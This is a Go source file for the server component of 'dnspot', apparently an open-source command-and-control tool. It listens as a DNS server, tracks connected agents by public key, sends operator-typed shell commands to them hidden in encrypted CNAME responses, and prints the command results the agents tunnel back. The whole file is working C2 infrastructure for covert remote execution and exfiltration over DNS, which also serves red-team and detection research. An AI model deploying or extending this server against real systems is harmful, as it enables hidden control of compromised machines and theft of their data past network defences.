package server

import (
	"bufio"
	"bytes"
	"compress/gzip"
	"encoding/binary"
	"fmt"
	"io"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"

	log "github.com/sirupsen/logrus"

	"github.com/miekg/dns"
	"github.com/mosajjal/dnspot/c2"
	"github.com/mosajjal/dnspot/cryptography"
)

var Config struct {
	LogFile                  string
	OutFile                  string
	LogLevel                 uint8
	PrivateKeyBase36         string
	privateKey               *cryptography.PrivateKey
	ListenAddress            string
	EnforceClientKeys        bool
	AcceptedClientKeysBase36 []string
	acceptedClientKeys       *[]cryptography.PublicKey
	DnsSuffix                string
	Mode                     string
}

// todo: come up with i/o
var IO interface {
	Logger(level uint8, format string, args ...interface{})
	GetInputFeed() chan string
	GetOutputFeed() chan string
}

var ServerPacketBuffersWithSignature = make(map[int][]c2.MessagePacketWithSignature)

// 3d buffer for public key and parentpartID. first string is the public key
var outgoingBuffer = make(map[string]map[uint16][]string)
var dedupHashTable = make(map[uint64]bool)

// dedupPrevMsgHash is only for consecutive message duplicates
var dedupPrevMsgHash uint64

type agentStatusForServer struct {
	LastAckFromAgentServerTime      uint32
	LastAckFromAgentPacketTime      uint32
	NextMessageType                 c2.MsgType
	NextParentPartId                uint16
	HealthCheckIntervalMilliSeconds uint32
}

// first string is the public key
var ConnectedAgents = make(map[string]agentStatusForServer)
var CommandWriter io.Writer

// log received healthcheck. if the agent is due to run a task, the server's response
// to the healthcheck will become different.
func MessageHealthcheckHandler(Packet c2.MessagePacketWithSignature, q *dns.Msg) error {
	log.Infof("Healthcheck, coming from %s", Packet.Signature)
	//register new agent in agent list
	agent, ok := ConnectedAgents[Packet.Signature.String()]
	if !ok {
		log.Infof("Registering new agent in our Connected Agent List, %d agent(s) are connected", len(ConnectedAgents)+1)

		// UiAgentList.AddItem(Packet.Signature.String(), "", rune(len(ConnectedAgents)+65), nil)
		ConnectedAgents[Packet.Signature.String()] = agentStatusForServer{
			NextMessageType:                 c2.MessageHealthcheck,
			HealthCheckIntervalMilliSeconds: 10000, //todo: make this configurable
		}
	}
	// agent already exists, only update the timestamps and prepare the next packet based on message type
	agent.LastAckFromAgentPacketTime = Packet.Msg.TimeStamp
	agent.LastAckFromAgentServerTime = uint32(time.Now().Unix())
	ConnectedAgents[Packet.Signature.String()] = agent
	switch agent.NextMessageType {
	case c2.MessageHealthcheck: // no one else has claimed a new command for this agent, so I'm gonna go ahead and do the routine task and respond with a Pong
		payload := []byte("Pong!")
		// check time difference between packet time nad server time. anything after 10 seconds is unacceptable
		// todo: fix this before removing the comment. this doesn't take timezones into effect
		// if math.Abs(float64(Packet.Msg.TimeStamp-uint32(time.Now().Unix()))) > 10 {
		// 	agent.NextMessageType = c2.MessageSyncTime
		// 	ConnectedAgents[Packet.Signature.String()] = agent
		// 	// change payload to a UTC timestamp just in case the agent works better with payload than server's timestamp
		// 	payload = []byte(time.Now().Format("2006-01-02T15:04:05-0700"))
		// }
		//todo: should we pass it on to MessageSyncTimeHandler function here?

		// todo: check the actual next message time here and send a message appropriately
		log.Infof("preparing a response for a healthcheck message")
		msg := c2.MessagePacket{
			TimeStamp:   uint32(time.Now().Unix()),
			MessageType: agent.NextMessageType,
		}
		Answers, _, err := c2.PreparePartitionedPayload(msg, payload, Config.DnsSuffix, Config.privateKey, Packet.Signature)
		if err != nil {
			log.Errorf("Error preparing a response for a healthcheck message: %s", err.Error())
			return err
		}

		for _, A := range Answers {
			cname, err := dns.NewRR(fmt.Sprintf("%s CNAME %s", q.Question[0].Name, A)) //todo:fix the 0 index
			if err != nil {
				log.Warnf("Error: %v", err) //todo:fix
			}
			q.Answer = append(q.Answer, cname)
		}
		// this only happens when we're switching mode. after this one, the rest of the requests
		// won't be coming in as healthcheck originally, so won't be hitting this function altogether
	case c2.MessageExecuteCommand:
		// todo: let's see if we can send two commands here, one payload and another for adjusting the interval
		// first check to see if this is a residual packet from a previous multi-part convo
		if len(outgoingBuffer[Packet.Signature.String()][agent.NextParentPartId]) == 0 {
			return nil

		}
		cname, err := dns.NewRR(fmt.Sprintf("%s CNAME %s", q.Question[0].Name, outgoingBuffer[Packet.Signature.String()][agent.NextParentPartId][0])) //todo:fix the 0 index
		if err != nil {
			log.Warnf("Error: %v", err) //todo:fix
		}
		q.Answer = append(q.Answer, cname)
	}
	return nil
}

// shows the output of any command run by agent and sent back to us.
func displayCommandResult(fullPayload []byte, signature *cryptography.PublicKey) {
	// probably should save this in a temp file rather than log. //todo
	out := bytes.Trim(fullPayload, "\x00")
	if c2.FNV1A(out) == uint64(dedupPrevMsgHash) {
		return
	}
	dedupPrevMsgHash = c2.FNV1A(out)
	rdata := bytes.NewReader(out)
	r, err := gzip.NewReader(rdata)
	if err == nil {
		out, _ = io.ReadAll(r)
	}
	//todo: this could be a chat coming in from the agent, so "command result" might not be appropiate
	fmt.Printf("[%s]: %s\n", signature.String(), out)
	// we only need the result printed in exec mode. in echo mode, this is just a "sent" tickbox
	if Config.Mode == "exec" {
		fmt.Fprintf(CommandWriter, "command result coming from %s:\n%s\n------\n", signature.String(), string(out))
	}
}

func HandleExecuteCommandResponse(Packet c2.MessagePacketWithSignature, q *dns.Msg) error {
	_, ok := ConnectedAgents[Packet.Signature.String()]
	if !ok {
		log.Errorf("Agent not recognized")
	}
	// handle multipart incoming
	ServerPacketBuffersWithSignature[int(Packet.Msg.ParentPartID)] = append(ServerPacketBuffersWithSignature[int(Packet.Msg.ParentPartID)], Packet)
	// if Packet.Msg.ParentPartID != 0 { // multi part
	//fist and middle packets
	msg := c2.MessagePacket{
		TimeStamp:    uint32(time.Now().Unix()),
		MessageType:  c2.MessageExecuteCommandResponse,
		ParentPartID: Packet.Msg.ParentPartID,
		PartID:       Packet.Msg.PartID,
	}
	payload := []byte("Ack!")
	if Packet.Msg.IsLastPart || (Packet.Msg.ParentPartID == 0) {
		msg.IsLastPart = true
		agent := ConnectedAgents[Packet.Signature.String()]
		agent.NextMessageType = c2.MessageHealthcheck
		ConnectedAgents[Packet.Signature.String()] = agent
		payload = []byte("Ack! Last Part")
	}
	// log.Infof("sending plyload %#v\n", msg)
	// time.Sleep(2 * time.Second)
	Answers, _, _ := c2.PreparePartitionedPayload(msg, payload, Config.DnsSuffix, Config.privateKey, Packet.Signature)
	for _, A := range Answers {
		cname, err := dns.NewRR(fmt.Sprintf("%s CNAME %s", q.Question[0].Name, A)) //todo:fix the 0 index
		if err != nil {
			log.Warnf("Error: %v", err) //todo:fix
		}
		q.Answer = append(q.Answer, cname)
	}
	if !Packet.Msg.IsLastPart && !(Packet.Msg.ParentPartID == 0) {
		return nil
	}
	// }

	fullPayload := make([]byte, 0)
	packets := c2.CheckMessageIntegrity(ServerPacketBuffersWithSignature[int(Packet.Msg.ParentPartID)])
	for _, packet := range packets {
		packetPayload := packet.Msg.Payload[:]
		fullPayload = append(fullPayload, packetPayload...)
	}
	// todo: clean the memory for this parentpartID
	// delete(ServerPacketBuffersWithSignature, int(packets[0].Msg.ParentPartID))
	// todo: how do we acknowledge that we're done here and we both go back to healthcheck?
	displayCommandResult(fullPayload, Packet.Signature)
	// remove the buffer from memory
	delete(ServerPacketBuffersWithSignature, int(Packet.Msg.ParentPartID))
	return nil
}

func MustSendMsg(msgPacket c2.MessagePacket, agentPublicKey *cryptography.PublicKey, msg string) error {
	// As part of the incoming packet, we'll get the partid as well as parentPartId so we know which part to send next. we just need to cache the whole partition up
	Answers, parentPartId, _ := c2.PreparePartitionedPayload(msgPacket, []byte(msg), Config.DnsSuffix, Config.privateKey, agentPublicKey)
	//todo: single part messages always have parentPartId = 0, so we need to check if it's single part or multi part and probably don't cache
	//todo: what are we getting from the client? let's decrypt and log those

	if targetBuffer, ok := outgoingBuffer[agentPublicKey.String()][parentPartId]; ok {
		if parentPartId == 0 {
			// if there was a single packet living in the cache before, delete it before proceed
			// todo: maybe this is the place for this but I think it's better to be cleaned up elsewhere
			// delete(outgoingBuffer[agentPublicKey.String()], parentPartId)
			outgoingBuffer[agentPublicKey.String()] = make(map[uint16][]string)
			outgoingBuffer[agentPublicKey.String()][parentPartId] = append(outgoingBuffer[agentPublicKey.String()][parentPartId], Answers[0])
		}
		log.Infof("key and ParentPartId already exist in the buffer, overwriting...")

	} else {
		//initialize the map
		outgoingBuffer[agentPublicKey.String()] = make(map[uint16][]string)
		targetBuffer = append(targetBuffer, Answers...)
		outgoingBuffer[agentPublicKey.String()][parentPartId] = targetBuffer
	}
	log.Infof("command was successfully added to outgoing buffer to be sent")

	// set NextMessageType to let the healthcheck responder know
	agent := ConnectedAgents[agentPublicKey.String()]
	agent.NextMessageType = msgPacket.MessageType
	agent.NextParentPartId = parentPartId
	ConnectedAgents[agentPublicKey.String()] = agent
	// todo: potentially a channel to notify the changes to agent's status and flick it to true when this happens?
	// todo: set interval before returning the packet
	return nil
}

// handle the Server switching an agent's status to run command with a payload, puts the agent's status to run command so we handle it next time the healthcheck arrives
// the input of this function comes directly from TUI input field. it was renamed
// because it'll now consider they message type as a configuration item and
// can provide command execution as well as chat.
func SendMessageToAgent(agentPublicKey *cryptography.PublicKey, command string) error {
	fmt.Fprintf(CommandWriter, "sending message '%s' on %s\n", command, agentPublicKey.String())
	var cmdType c2.CmdType
	if Config.Mode == "chat" {
		cmdType = c2.CommandEcho
	}
	if Config.Mode == "exec" {
		cmdType = c2.CommandExec
	}
	msg := c2.MessagePacket{
		TimeStamp:   uint32(time.Now().Unix()),
		MessageType: c2.MessageExecuteCommand,
		Command:     cmdType,
	}
	return MustSendMsg(msg, agentPublicKey, command)
}

func MessageChatHandler(Packet c2.MessagePacketWithSignature, q *dns.Msg) error {
	agent := ConnectedAgents[Packet.Signature.String()]
	acknowledgedId := Packet.Msg.PartID
	// handle last packet ID
	if uint16(len(outgoingBuffer[Packet.Signature.String()][agent.NextParentPartId])) == acknowledgedId {
		return nil
	}
	if Packet.Msg.IsLastPart || Packet.Msg.ParentPartID == 0 {
		// reset the agent status to healthcheck and clean the buffer
		agent.NextMessageType = c2.MessageHealthcheck
		delete(outgoingBuffer[Packet.Signature.String()], agent.NextParentPartId)
		return nil
	}
	cname, err := dns.NewRR(fmt.Sprintf("%s CNAME %s", q.Question[0].Name, outgoingBuffer[Packet.Signature.String()][agent.NextParentPartId][acknowledgedId+1]))
	if err != nil {
		log.Warnf("Error: %v", err) //todo:fix
	}
	// todo: go back to the healthcheck handler and send the next packet
	// todo: print output
	q.Answer = append(q.Answer, cname)
	// log.Infof("sending chat message '%s' to the client", command)
	//msg := c2.MessagePacket{
	//	TimeStamp:   uint32(time.Now().Unix()),
	//	MessageType: c2.MessageChat,
	//}
	//return MustSendMsg(msg, agentPublicKey, c2.MessageChat, command)
	return nil
}

func MessageChatResResHandler(Packet c2.MessagePacketWithSignature, q *dns.Msg) error {
	// we only get this when the message's last part have been received and parsed.
	// just need to switch back the agent to healthcheck mode
	agent := ConnectedAgents[Packet.Signature.String()]
	agent.NextMessageType = c2.MessageHealthcheck
	ConnectedAgents[Packet.Signature.String()] = agent

	return nil

}

// remove idle agents after 60 seconds
func RemoveIdleAgents() {
	log.Infof("Removing idle agents")
	for k, v := range ConnectedAgents {
		idleTime := time.Now().Unix() - int64(v.LastAckFromAgentServerTime)
		if idleTime > 60 {
			log.Infof("removing agent %s since it has been idle for %d seconds", k, idleTime)
			delete(ConnectedAgents, k)
			// for i := range UiAgentList.FindItems(k, "", false, true) {
			// 	UiAgentList.RemoveItem(i)
			// }
		}
	}
}

// handle incoming "ack" packets of multipart RunCommand packets from agents
func HandleRunCommandAckFromAgent(Packet c2.MessagePacketWithSignature, q *dns.Msg) error {
	agent := ConnectedAgents[Packet.Signature.String()]
	acknowledgedId := Packet.Msg.PartID
	// handle last packet ID
	if uint16(len(outgoingBuffer[Packet.Signature.String()][agent.NextParentPartId])) == acknowledgedId {
		return nil
	}
	if Packet.Msg.IsLastPart {
		// reset the agent status to healthcheck and clean the buffer
		agent.NextMessageType = c2.MessageHealthcheck
		delete(outgoingBuffer[Packet.Signature.String()], agent.NextParentPartId)
		return nil
	}
	cname, err := dns.NewRR(fmt.Sprintf("%s CNAME %s", q.Question[0].Name, outgoingBuffer[Packet.Signature.String()][agent.NextParentPartId][acknowledgedId+1]))
	if err != nil {
		log.Warnf("Error: %v", err) //todo:fix
	}
	// todo: go back to the healthcheck handler and send the next packet
	// todo: print output
	q.Answer = append(q.Answer, cname)
	return nil
}

func MessageSetHealthIntervalHandler(Packet c2.MessagePacketWithSignature, q *dns.Msg, durationMilliseconds uint32) error {
	msg := c2.MessagePacket{
		TimeStamp:   uint32(time.Now().Unix()),
		MessageType: c2.MessageSetHealthInterval,
	}
	payload := []byte{}
	binary.BigEndian.PutUint32(payload, durationMilliseconds)
	Answers, _, _ := c2.PreparePartitionedPayload(msg, payload, Config.DnsSuffix, Config.privateKey, Packet.Signature)
	for _, A := range Answers {
		cname, err := dns.NewRR(fmt.Sprintf("%s CNAME %s", q.Question[0].Name, A)) //todo:fix the 0 index
		if err != nil {
			log.Warnf("Error: %v", err) //todo:fix
		}
		q.Answer = append(q.Answer, cname)
	}
	return nil
}

func isMsgDuplicate(data []byte) bool {
	// dedup checks
	skipForDudup := false
	hash := c2.FNV1A(data)
	_, ok := dedupHashTable[hash] // check for existence
	if !ok {
		dedupHashTable[hash] = true
	} else {
		skipForDudup = true
	}

	return skipForDudup
}

func parseQuery(m *dns.Msg) error {
	// since the C2 works by A questions at the moment, we cna check dedup by looking at the first question
	// todo: test this
	if isMsgDuplicate([]byte(m.Question[0].Name)) {
		log.Infof("Duplicate message received, discarding")
		return nil
	}
	outs, skip, err := c2.DecryptIncomingPacket(m, Config.DnsSuffix, Config.privateKey, nil)
	if err != nil {
		log.Infof("Error in Decrypting incoming packet: %v", err)
	}
	if !skip {
		for _, o := range outs {
			switch msgType := o.Msg.MessageType; msgType {
			case c2.MessageHealthcheck:
				return MessageHealthcheckHandler(o, m)
			case c2.MessageExecuteCommand:
				return HandleRunCommandAckFromAgent(o, m)
			case c2.MessageExecuteCommandResponse:
				return HandleExecuteCommandResponse(o, m)
			case c2.MessageSetHealthInterval:
				return nil //
			case c2.MessageSyncTime:
				return nil // automatically done as part of routine healthcheck
			}
		}
	}

	// }
	//todo: prepare response
	return nil
}

func handle53(w dns.ResponseWriter, r *dns.Msg) {
	m := new(dns.Msg)
	m.SetReply(r)
	m.Compress = true

	switch r.Opcode {
	case dns.OpcodeQuery:
		err := parseQuery(m)
		if err != nil {
			log.Warnf("bad request: %s", err)
		}
	}
	if err := w.WriteMsg(m); err != nil {
		log.Warnln(err)
	}
}

func runDns() {

	dns.HandleFunc(".", handle53)

	// start server
	server := &dns.Server{Addr: Config.ListenAddress, Net: "udp"}
	log.Infof("Started DNS on %s -- listening", server.Addr)
	err := server.ListenAndServe()
	if err != nil {
		log.Fatalln(err)
	}
	if err := server.Shutdown(); err != nil {
		log.Warnln(err)
	}

}

// returns the first item of an arbitrary map
func First(m map[string]agentStatusForServer) (out string) {
	for k := range m {
		out = k
		break
	}
	// this should be unreachable
	return
}

func RunServer() {
	// set global flag that we're running as server
	log.SetLevel(log.Level(Config.LogLevel))
	if Config.LogLevel >= uint8(log.DebugLevel) {
		log.SetReportCaller(true)
	}
	if Config.LogFile != "" {
		f, err := os.OpenFile(Config.LogFile, os.O_RDWR|os.O_CREATE|os.O_APPEND, 0666)
		if err != nil {
			log.Fatalf("error opening file: %v", err)
		}
		mw := io.MultiWriter(os.Stdout, f)
		log.SetOutput(mw)
	} else {
		log.SetOutput(os.Stdout)
	}

	if Config.OutFile != "" {
		f, err := os.OpenFile(Config.OutFile, os.O_RDWR|os.O_CREATE|os.O_APPEND, 0666)
		if err != nil {
			log.Fatalf("error opening file: %v", err)
		}
		CommandWriter = io.MultiWriter(os.Stdout, f)
	} else {
		CommandWriter = os.Stdout
	}

	var err error
	Config.privateKey, err = cryptography.PrivateKeyFromString(Config.PrivateKeyBase36)
	if err != nil {
		log.Fatalln(err)
	}

	log.Infof("Use the following public key to connect clients: %s", Config.privateKey.GetPublicKey().String())

	// todo: public keys

	if !strings.HasSuffix(Config.DnsSuffix, ".") {
		Config.DnsSuffix = Config.DnsSuffix + "."
	}
	if !strings.HasPrefix(Config.DnsSuffix, ".") {
		Config.DnsSuffix = "." + Config.DnsSuffix
	}

	go runDns()

	go func() {
		reader := bufio.NewReader(os.Stdin)
		for {
			fmt.Print("-> ")
			text, _ := reader.ReadString('\n')
			// convert CRLF to LF
			text = strings.Replace(text, "\n", "", -1)
			agent := First(ConnectedAgents)
			// agent, _ := UiAgentList.GetItemText(UiAgentList.GetCurrentItem())
			pubkey, err := cryptography.PublicKeyFromString(agent)
			if err != nil {
				log.Errorln("can't find a key to send a message to")
			} else if len(text) > 0 {
				_ = SendMessageToAgent(pubkey, text)
			}
		}
	}()

	// handle interrupts
	signalChannel := make(chan os.Signal, 2)
	signal.Notify(signalChannel, os.Interrupt, syscall.SIGTERM)
	go func() {
		sig := <-signalChannel
		switch sig {
		case os.Interrupt:
			os.Exit(0)
		case syscall.SIGTERM:
			os.Exit(0)
		}
	}()

	select {}

}
